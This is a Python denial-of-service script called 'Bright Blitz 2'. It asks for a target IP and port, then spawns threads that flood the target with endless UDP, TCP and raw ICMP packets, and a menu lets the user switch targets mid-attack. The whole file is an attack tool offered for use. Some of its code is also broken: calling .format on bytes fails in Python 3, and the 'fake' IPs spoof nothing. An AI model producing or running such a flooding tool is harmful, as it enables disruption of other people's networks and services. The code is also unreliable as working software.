import socket
import threading
import random
import time
import logging
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ASCII Art Banner
print("""
  _______  _______  _______  _______  _______  _______  _______
 |       ||       ||       ||       ||       ||       ||       |
 |  _____||  _____||  _____||  _____||  _____||  _____||  _____|
 | |_____ | |_____ | |_____ | |_____ | |_____ | |_____ | |_____ 
 |_____  ||_____  ||_____  ||_____  ||_____  ||_____  ||_____  |
        ||       ||       ||       ||       ||       ||       |
        ||_______||_______||_______||_______||_______||_______|
        |       |       |       |       |       |       |       |
        |  BRIGHT  |  BLITZ 2 |  BRIGHT  |  BLITZ 2 |  BRIGHT  |  BLITZ 2 |
        |       |       |       |       |       |       |       |
        |_______|_______|_______|_______|_______|_______|_______|
""")

# Configuration
target = input("Insert target's IP: ")
port = int(input("Insert Port: "))
num_threads = int(input("Insert number of Threads: "))
fake_ips = ['44.197.175.168', '192.168.1.100', '10.0.0.1', '8.8.8.8', '8.8.4.4']

# Attack Functions
def attack_udp():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                payload = b"GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".format(
                    random.choice(fake_ips).encode())
                sock.sendto(payload, (target, port))
                time.sleep(0.01)
    except Exception as e:
        logging.error(f"UDP Attack Error: {e}")

def attack_tcp():
    try:
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target, port))
                payload = b"GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".format(
                    random.choice(fake_ips).encode())
                sock.send(payload)
                time.sleep(0.01)
    except Exception as e:
        logging.error(f"TCP Attack Error: {e}")


def attack_icmp():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
            while True:
                icmp_payload = b"\x08\x00\x00\x00\x00\x00\x00\x00"
                sock.sendto(icmp_payload, (target, 0))
                time.sleep(0.01)
    except Exception as e:
        logging.error(f"ICMP Attack Error: {e}")

# Start Threads
def start_attacks(num_threads):
    with ThreadPoolExecutor(max_workers=num_threads * 3) as executor:
        for _ in range(num_threads):
            executor.submit(attack_udp)
            executor.submit(attack_tcp)
            executor.submit(attack_icmp)

# Initial attack
start_attacks(num_threads)

# Additional Features
def update_configuration():
    global target, port, num_threads
    while True:
        print("\nOptions:")
        print("1. Change target IP")
        print("2. Change port")
        print("3. Change number of threads")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            target = input("Enter new target IP now: ")
            logging.info(f"Target IP updated to {target}")
        elif choice == "2":
            port = int(input("Enter new port: "))
            logging.info(f"Port updated to {port}")
        elif choice == "3":
            new_threads = int(input("Enter new number of threads: "))
            logging.info(f"Updating thread count from {num_threads} to {new_threads}")
            num_threads = new_threads
            # Restart attacks with new thread count
            # Cancel all previous threads (handled automatically by ThreadPoolExecutor)
            start_attacks(num_threads)
        elif choice == "4":
            logging.info("Exiting...")
            break
        else:
            logging.warning("Invalid choice. Please attempt and dont write another wrong one.")

update_configuration()
